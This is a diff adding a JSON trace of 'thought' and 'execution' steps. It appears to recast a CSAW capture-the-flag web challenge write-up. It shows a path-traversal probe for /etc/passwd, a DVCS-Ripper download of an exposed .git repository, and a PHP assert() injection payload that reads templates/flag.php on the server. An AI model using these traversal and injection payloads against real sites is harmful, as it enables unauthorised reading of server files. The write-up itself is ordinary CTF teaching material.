@@ -1,0 +1,18 @@
+[
+    {
+        "type": "thought",
+        "content": "Entering the site, the first thing that comes to mind is a LFI attack. The site is including a page which is requested in the URL.\n\nThe following table describes the possible respond pages:\n\nURL\tResult\nhttp://web.chal.csaw.io:8000/?page=home\tThe \u201chome\u201d page is shown.\nhttp://web.chal.csaw.io:8000/?page=about\tThe \u201cabout\u201d page is shown.\nhttp://web.chal.csaw.io:8000/?page=contact\tThe \u201ccontact\u201d page is shown.\nhttp://web.chal.csaw.io:8000/?page=Megabeets\tJust a message saying: \u201cThat file doesn\u2019t exist!\u201d\nhttp://web.chal.csaw.io:8000/?page=flag\tAn empty page is shown inside the website.\nhttp://web.chal.csaw.io:8000/?page=../../../../etc/passwd\tJust a message saying: \u201cDetected hacking attempt!\u201d\nLooking at the source code i saw the following comment:\n\n<!--<li ><a href=\"?page=flag\">My secrets</a></li> -->\nOk, I need to get the \u201cflag\u201d page but any LFI technique I tried didn\u2019t work. I thought about something else, In the \u201cabout\u201d page the creator of the site mentioned that it was built using git. So let\u2019s see if I am able to download the repository. The page http://web.chal.csaw.io:8000/.git/config exists so I downloaded the repository using DVCS-RIPPER."
+    },
+    {
+        "type": "execution",
+        "content": "rip-git.pl -v -u http://web.chal.csaw.io:8000/.git/"
+    },
+    {
+        "type": "thought",
+        "content": "So the page is using assert() which is vulnerable to Command Injection attack. After a little trial and error I came up with the answer:"
+    },
+    {
+        "type": "execution",
+        "content": "(Invoke-WebRequest \"http://web.chal.csaw.io:8000/?page=Megabeets') || var_dump(file_get_contents('templates/flag.php'));// Comment\").Content"
+    }
+]
